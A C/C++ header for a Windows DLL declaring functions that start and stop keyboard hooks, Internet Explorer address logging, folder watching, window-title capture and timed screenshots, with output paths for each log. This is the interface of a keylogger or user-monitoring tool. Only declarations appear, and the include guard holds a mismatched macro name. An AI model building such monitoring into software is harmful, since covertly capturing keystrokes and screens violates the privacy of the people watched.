#pragma once

#ifndef __HOOKS_H
#define __KOOKS_H
#ifndef __EXPORTING__
#define __OPERATION__ __declspec(dllimport)
#else
#define __OPERATION__ __declspec(dllexport)
#endif

// Hooks command target

BOOL __OPERATION__ startKB(void); 
BOOL __OPERATION__  startIEAddress(void);
BOOL __OPERATION__  startFileFolder(CString paths[],int pathsNum/*number of paths*/);
BOOL __OPERATION__  startWindowTitle(void);
BOOL __OPERATION__  startScreenShoots(bool activeWindow/*or full screen*/,float w,float h,int time);

	//stop watch services
BOOL __OPERATION__  stopKB(void);
BOOL __OPERATION__  stopIEAddress(void);
BOOL __OPERATION__  stopFileFolder(void);
BOOL __OPERATION__  stopWindowTitle(void);
BOOL __OPERATION__  stopScreenShoots(void);


bool  __OPERATION__ setPaths(CString kb, CString ie, CString ff, CString wt, CString ss);


#endif